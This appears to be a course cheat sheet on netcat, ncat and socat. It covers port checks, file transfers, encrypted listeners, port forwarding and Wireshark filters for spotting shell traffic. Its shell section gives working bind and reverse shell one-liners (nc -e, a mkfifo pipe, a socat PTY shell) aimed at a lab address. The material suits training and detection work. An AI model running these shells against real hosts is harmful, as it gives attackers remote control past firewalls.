# 📋 Module 06 Cheat Sheet: Netcat & Socat

## 🐱 Core Netcat (`nc`) Commands
```bash
# Connect to remote service (Client mode)
nc -vn <ip> <port>

# Spawn a TCP listener (Server mode)
nc -lvnp <port>

# Test port without sending data (Zero-I/O check)
nc -zvn -w1 <ip> <port>

# Quick TCP port sweep
nc -zvn -w1 10.10.10.20 20-100

# UDP mode (Client / Listener)
nc -uvn <ip> <port>
nc -ulvnp <port>
```

---

## 📁 File Transfers
```bash
# 1. Receiver starts first:
nc -lvnp 9000 > received_file.zip

# 2. Sender transmits:
nc -vn 10.10.10.20 9000 < local_file.zip

# Streaming entire compressed directory:
# Receiver:
nc -lvnp 9000 | tar -xzvf -
# Sender:
tar -czvf - /var/log/ | nc -vn 10.10.10.20 9000
```

---

## 🐚 Shell Mechanics
```bash
# BIND SHELL (Target listens, attacker connects in)
# Target:
nc -lvnp 4444 -e /bin/bash
# Attacker connects:
nc <target_ip> 4444

# REVERSE SHELL (Attacker listens, target dials out - Bypasses firewalls!)
# Attacker:
nc -lvnp 4444
# Target:
nc 10.10.10.10 4444 -e /bin/bash

# Reverse Shell without -e flag (Unix FIFO pipe)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f
```

---

## 🔒 Modern Encrypted Ncat (`ncat`)
```bash
# Start an SSL/TLS encrypted listener
ncat -lvnp 8443 --ssl

# Connect with SSL/TLS encryption
ncat -vn 10.10.10.20 8443 --ssl

# Built-in firewall access control
ncat -lvnp 9000 --allow 10.10.10.10
ncat -lvnp 9000 --allow 10.10.10.0/24 --deny 10.10.10.99

# Multi-user encrypted chat room
ncat -lvnp 9999 --ssl --broker
```

---

## 🔀 Socat Relay & Port Forwarding
```bash
# Port Forwarding: Forward local port 8080 to remote port 80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.10.20:80

# Fully interactive TTY reverse shell (with tab completion & Ctrl+C!)
# Attacker:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444
# Target:
socat TCP:10.10.10.10:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane
```

---

## 🦈 Detecting Shells in Wireshark
```
# Find unencrypted interactive shell commands
tcp.port == 4444 && data contains "uid="
tcp.port == 4444 && data contains "whoami"

# Follow the stream to read the full shell session
tcp.stream eq <index>
```
